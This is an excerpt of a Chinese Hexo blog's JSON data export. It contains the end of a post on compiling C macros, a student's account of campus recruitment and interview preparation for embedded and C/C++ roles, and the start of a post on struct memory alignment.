title=\"链接\"></a>链接</h1><p>键入以下命令并执行可执行程序：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc mocro_define.o -o mocro_define</div><div class=\"line\">./mocro_define</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/define_o.png\" alt=\"define_o\"><br>最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>这篇文章主要还是从C程序的编译过程来逐步拆解分析。<strong>宏定义</strong>本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。</p>\n"},{"title":"求职艰辛路","date":"2016-10-17T08:25:59.000Z","_content":"\n> 经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.\n\n老吴去年心得:[http://www.nephen.com/2015/11/job-summary](http://www.nephen.com/2015/11/job-summary)\n\n----------\n## 个人技术体系\n大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。\n### 为什么选择了嵌入式?\n个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课....好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了*加密与解密*,*Windows PE权威指南*,*黑客大曝光*等,各种幻想,但是眼高手低,几乎看不懂里面的原理...,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.\n### 为什么涉猎安全技术?\n相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索**教育**二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷...随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.\n### 为什么看起来有些xjbg\n据说计算机类相关专业考研的专业课包括**数据结构**,**计算机组成原理**,**操作系统**,**计算机网络**.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题**你觉得你的优点和缺点是什么**我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.\n\n## 如何校招?\n首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿...\n\n## 笔试\n关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些**套路**搞明白,笔试和面试都有**套路**.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了...\n\n## 面试\n笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如**指针和引用的异同**,**线程和进程的区别**,**#define用法**,**static,const用法**,**C++多态的实现方法**,**TCP时序图**,**各种排序,查找,遍历等的算法原理**,**网络编程中IO复用的情况**等等,Linux的后台开发可以参考这个[链接](http://blog.csdn.net/huangjm_13/article/details/8799595).搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞**剑指offer**和**程序员面试宝典**等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:**\"你有什么需要问我的吗?\"**,这个时候很重要,或**削发明志**,或**力挽狂澜**.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!\n\n## HR约谈\n一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?\n\n## 总结\n感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!\n","source":"_posts/job-summary.md","raw":"---\ntitle: 求职艰辛路\ndate: 2016-10-17 16:25:59\ncategories:\n- misc\ntags:\n- misc\n---\n\n> 经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.\n\n老吴去年心得:[http://www.nephen.com/2015/11/job-summary](http://www.nephen.com/2015/11/job-summary)\n\n----------\n## 个人技术体系\n大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。\n### 为什么选择了嵌入式?\n个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课....好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了*加密与解密*,*Windows PE权威指南*,*黑客大曝光*等,各种幻想,但是眼高手低,几乎看不懂里面的原理...,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.\n### 为什么涉猎安全技术?\n相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索**教育**二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷...随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.\n### 为什么看起来有些xjbg\n据说计算机类相关专业考研的专业课包括**数据结构**,**计算机组成原理**,**操作系统**,**计算机网络**.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题**你觉得你的优点和缺点是什么**我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.\n\n## 如何校招?\n首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿...\n\n## 笔试\n关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些**套路**搞明白,笔试和面试都有**套路**.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了...\n\n## 面试\n笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如**指针和引用的异同**,**线程和进程的区别**,**#define用法**,**static,const用法**,**C++多态的实现方法**,**TCP时序图**,**各种排序,查找,遍历等的算法原理**,**网络编程中IO复用的情况**等等,Linux的后台开发可以参考这个[链接](http://blog.csdn.net/huangjm_13/article/details/8799595).搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞**剑指offer**和**程序员面试宝典**等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:**\"你有什么需要问我的吗?\"**,这个时候很重要,或**削发明志**,或**力挽狂澜**.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!\n\n## HR约谈\n一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?\n\n## 总结\n感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!\n","slug":"job-summary","published":1,"updated":"2016-10-17T10:14:43.378Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7oa0002r1m1rd8tjsgp","content":"<blockquote>\n<p>经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.</p>\n</blockquote>\n<p>老吴去年心得:<a href=\"http://www.nephen.com/2015/11/job-summary\" target=\"_blank\" rel=\"external\">http://www.nephen.com/2015/11/job-summary</a></p>\n<hr>\n<h2 id=\"个人技术体系\"><a href=\"#个人技术体系\" class=\"headerlink\" title=\"个人技术体系\"></a>个人技术体系</h2><p>大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。</p>\n<h3 id=\"为什么选择了嵌入式\"><a href=\"#为什么选择了嵌入式\" class=\"headerlink\" title=\"为什么选择了嵌入式?\"></a>为什么选择了嵌入式?</h3><p>个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课….好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了<em>加密与解密</em>,<em>Windows PE权威指南</em>,<em>黑客大曝光</em>等,各种幻想,但是眼高手低,几乎看不懂里面的原理…,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.</p>\n<h3 id=\"为什么涉猎安全技术\"><a href=\"#为什么涉猎安全技术\" class=\"headerlink\" title=\"为什么涉猎安全技术?\"></a>为什么涉猎安全技术?</h3><p>相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索<strong>教育</strong>二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷…随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.</p>\n<h3 id=\"为什么看起来有些xjbg\"><a href=\"#为什么看起来有些xjbg\" class=\"headerlink\" title=\"为什么看起来有些xjbg\"></a>为什么看起来有些xjbg</h3><p>据说计算机类相关专业考研的专业课包括<strong>数据结构</strong>,<strong>计算机组成原理</strong>,<strong>操作系统</strong>,<strong>计算机网络</strong>.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题<strong>你觉得你的优点和缺点是什么</strong>我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.</p>\n<h2 id=\"如何校招\"><a href=\"#如何校招\" class=\"headerlink\" title=\"如何校招?\"></a>如何校招?</h2><p>首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿…</p>\n<h2 id=\"笔试\"><a href=\"#笔试\" class=\"headerlink\" title=\"笔试\"></a>笔试</h2><p>关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些<strong>套路</strong>搞明白,笔试和面试都有<strong>套路</strong>.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了…</p>\n<h2 id=\"面试\"><a href=\"#面试\" class=\"headerlink\" title=\"面试\"></a>面试</h2><p>笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如<strong>指针和引用的异同</strong>,<strong>线程和进程的区别</strong>,<strong>#define用法</strong>,<strong>static,const用法</strong>,<strong>C++多态的实现方法</strong>,<strong>TCP时序图</strong>,<strong>各种排序,查找,遍历等的算法原理</strong>,<strong>网络编程中IO复用的情况</strong>等等,Linux的后台开发可以参考这个<a href=\"http://blog.csdn.net/huangjm_13/article/details/8799595\" target=\"_blank\" rel=\"external\">链接</a>.搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞<strong>剑指offer</strong>和<strong>程序员面试宝典</strong>等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:<strong>“你有什么需要问我的吗?”</strong>,这个时候很重要,或<strong>削发明志</strong>,或<strong>力挽狂澜</strong>.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!</p>\n<h2 id=\"HR约谈\"><a href=\"#HR约谈\" class=\"headerlink\" title=\"HR约谈\"></a>HR约谈</h2><p>一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!</p>\n","excerpt":"","more":"<blockquote>\n<p>经过一个多月的奋战,昨天终于签约了,个人也算结束了校招吧,一路走来,倍感心酸.</p>\n</blockquote>\n<p>老吴去年心得:<a href=\"http://www.nephen.com/2015/11/job-summary\">http://www.nephen.com/2015/11/job-summary</a></p>\n<hr>\n<h2 id=\"个人技术体系\"><a href=\"#个人技术体系\" class=\"headerlink\" title=\"个人技术体系\"></a>个人技术体系</h2><p>大学三年来主要的学习方向是嵌入式，编程语言主要为Asm,C/C++，用shell和python脚本开发过树莓派等的相关功能。操作系统平台为Linux,做过STM32,TI等芯片的开发，2015-2016学年在嵌入式创新基地主要学习四轴飞行器，目前开发平台为外国开源之王Pixhawk；在物联网实验室主要学习物联网作品相关技术体系，包括ZigBee，RFID，QT上位机等。对于信息安全、网络安全和软件安全亦有涉猎。</p>\n<h3 id=\"为什么选择了嵌入式\"><a href=\"#为什么选择了嵌入式\" class=\"headerlink\" title=\"为什么选择了嵌入式?\"></a>为什么选择了嵌入式?</h3><p>个人对于计算机领域的起步较晚,高中及之前一直只会开关机等.大一恍恍惚惚地过了一年,基本没学啥,C和C++课程开得等于没学,数据结构和算法没好好听课….好在自己对于技术的热衷度不减,尤其是H4ck技术.大一的时候就买了<em>加密与解密</em>,<em>Windows PE权威指南</em>,<em>黑客大曝光</em>等,各种幻想,但是眼高手低,几乎看不懂里面的原理…,到大二开了数字电路的课程,瞬时间感觉底层在召唤我,所以在大二下结束的时候毅然决定加入嵌入式实验室学习.一进去直接上手stm32,买的正点原子的开发板,看着各个模块的介绍,照着提供的例程逐个地跑代码,修改代码,调试代码等.后期加入了四轴飞行器小组,担任软件组主攻手.到后来参与物联网实验室的建设,学习物联网相关技术,算是大致使得自己对整个计算机体系有了基本的认识.</p>\n<h3 id=\"为什么涉猎安全技术\"><a href=\"#为什么涉猎安全技术\" class=\"headerlink\" title=\"为什么涉猎安全技术?\"></a>为什么涉猎安全技术?</h3><p>相信每个学习计算机的或多或少地对于H4ck3r有所耳闻或是冲着这个来的,但是到了大学发现实际情况并非如此.如果高校开的课程还算综合的话确实什么都会接触一点,但是都不能深入了解(谁说读大学就是学技术找工作的,详情搜索<strong>教育</strong>二字).因此如果有兴趣,你肯定会自己主动去索取相关资料的,这样学起来也是很快,当然要记得多动手.在今天这个信息化时代,安全问题已经成了普遍问题了,而非各个国家特殊组织所专有的.当然也不排除某些商业公司逆向工程竞争对手的产品来Get功能或者渗透测试对方信息系统达到某种目的.信息对抗及攻防延伸了到前所未有的高度,大型互联网公司脱裤,撞库事件层出不穷…随便去@n网搜一下,H3i产有多赚钱?未来安全产业估值不可限量,有兴趣的你还是好好学基础吧.</p>\n<h3 id=\"为什么看起来有些xjbg\"><a href=\"#为什么看起来有些xjbg\" class=\"headerlink\" title=\"为什么看起来有些xjbg\"></a>为什么看起来有些xjbg</h3><p>据说计算机类相关专业考研的专业课包括<strong>数据结构</strong>,<strong>计算机组成原理</strong>,<strong>操作系统</strong>,<strong>计算机网络</strong>.我觉得挺合理的,这几门课程基本上能够概括计算机基本技术.有人会说,学那么多有用吗?企业到时候把人招进公司还不只是把一样做好就行了.现实可能是这样,但是作为一个计算机类相关专业的大学生,如果不懂原理,出了问题不知如何解决不会tm很尴尬吗?作为研究者就更加要有凡事都需要探索的精神.如果再给我一次机会重来大学的机会,我还是会贪婪地学习这么多,但是很会注重某个点.如果我架不起这个技术体系,我就会感到心虚(恨只恨起步太晚).对于面试官的问题<strong>你觉得你的优点和缺点是什么</strong>我就是实情这样回答的.因此我觉得,只要认真去搞过,那些东西都会是你的.</p>\n<h2 id=\"如何校招\"><a href=\"#如何校招\" class=\"headerlink\" title=\"如何校招?\"></a>如何校招?</h2><p>首先概括:大三暑假最好去实习,或者提前批,9-10月份的校招很吃亏.都是有很鲜明的例子,具体原因可自行推理,当然类似于我们专业的神哥这样的人物除外咯.9-10月份是各大企业来校招的高峰期,期间可能会冲突很多,但是简历一定要投.模板可参考乔布,知页等(虽然泄露个人信息).内容可参考企业对相关岗位的要求照葫芦画瓢.校招来的企业可参考各大高校的就业网,最好去省会知名高校的官网看,或者直接去心仪的企业官网查看,以及各大就业网站(毕竟很多企业都是委托第三方来制作招聘网站的)等.用文字图表编辑工具记录下校招行程,包括宣讲会,笔试面试发放offer等流程的具体日期.不清楚的可以咨询自己的学长学姐,他们是过来人,不会坑你的,否则就是你请他们的饭只有一顿…</p>\n<h2 id=\"笔试\"><a href=\"#笔试\" class=\"headerlink\" title=\"笔试\"></a>笔试</h2><p>关于技术岗和非技术岗的情况还是相差很远的.一般非技术岗位不需要笔试而直接进入群面环节.而技术岗一般会进行一轮笔试,内容几乎都是基础,当然也不排除大型公司提高难度.一定要把那些<strong>套路</strong>搞明白,笔试和面试都有<strong>套路</strong>.此处会省略很多字,因为在互联网上能够匹配到.把能够做的一定都做了,一般会结合笔试成绩和简历来决定是否进入下一轮环节.建议建立一个找工作的讨论组,每天发布新消息,讨论和总结相关试题等.毕竟赶场也不容易,可以多吃点儿了…</p>\n<h2 id=\"面试\"><a href=\"#面试\" class=\"headerlink\" title=\"面试\"></a>面试</h2><p>笔试中不会做的题目考完之后一定要弄懂!!!这个坑不填几乎就可以直接See You Again了.一面的面试官一般还是喜欢问一些基础,比如<strong>指针和引用的异同</strong>,<strong>线程和进程的区别</strong>,<strong>#define用法</strong>,<strong>static,const用法</strong>,<strong>C++多态的实现方法</strong>,<strong>TCP时序图</strong>,<strong>各种排序,查找,遍历等的算法原理</strong>,<strong>网络编程中IO复用的情况</strong>等等,Linux的后台开发可以参考这个<a href=\"http://blog.csdn.net/huangjm_13/article/details/8799595\">链接</a>.搞熟了就会了.技术嘛,就是不断学习和应用的过程.二面一般是压力测试,讲一些自己做过的项目,怎么做的,怎么解决问题的等,可以搞一搞<strong>剑指offer</strong>和<strong>程序员面试宝典</strong>等书籍.在和面试官交流的过程可以稍微引导一下,体现出一个循序渐进的过程.在最后,一般面试官会说:<strong>“你有什么需要问我的吗?”</strong>,这个时候很重要,或<strong>削发明志</strong>,或<strong>力挽狂澜</strong>.一定不要傻乎乎地啥都不问就走了.所以有些技巧还是需要把握的,技术能力是一个很重要的因素,但是也要注意细节.可能某些企业不怎么想去,但是也可以去笔试面试,亲身收获面经,为更好的做准备.不打无准备的仗!!!</p>\n<h2 id=\"HR约谈\"><a href=\"#HR约谈\" class=\"headerlink\" title=\"HR约谈\"></a>HR约谈</h2><p>一般过了两面就会跟人力资源的HR姐姐约谈待遇和薪水问题,某些企业都是明码标价的.我是觉得应届毕业生还是应该多关注行业和自己感兴趣的技术,不能太过于强求金子,当然食宿也得考虑.找到工作仅仅只是一个开始,后面还需要不断学习新的技术和沉淀,这么早确定自己的未来有意思不?</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>感谢诸位背后的支持,在这段日子里一直有一群小伙伴一起为公共交通事业作出卓越贡献,大家能够抗住周围的压力并发挥出自己的实力,是一个成熟的过程.祝愿小伙伴们早日找到心仪的工作,继续加油!!!</p>\n"},{"title":"memory_align","date":"2016-08-21T13:24:53.000Z","_content":"\n\n## 关于C/C++中结构体(类)内存对齐问题  \n\n---\n\n> 各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛[stackoverflow](http://stackoverflow.com/ \"Stack Overflow\")等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．\n\n---\n可参考资料：  \n[维基百科](https://en.wikipedia.org/wiki/Data_structure_alignment#Problems \"维基百科\")\n[StackOverflow GCC Structure](http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs)\n[GCC文档](https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html)\n### 1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:  \n#### 32位编译器：\n      char ：1个字节\n      char*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   4个字节\n      long long:  8个字节\n      unsigned long:  4个字节\n#### 64位编译器：\n      char ：1个字节\n      char* (即指针变量): 8个字节\n      short int : 2个字节\n      int：  4个字节\n      unsigned int : 4个字节\n      float:  4个字节\n      double:   8个字节\n      long:   8个字节\n      long long:  8个字节\n      unsigned long:  8个字节  \n其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．\n\n---\n\n### 2. 变量排放规则(自己的见解)  \n#### 1. 内置类型对象(如char<1字节>、int<现代PC编译器普遍为4字节>等)的**对齐起始地址**为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.  \n#### 2. 整个结构体或者类的**大小**为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。  \n\n> 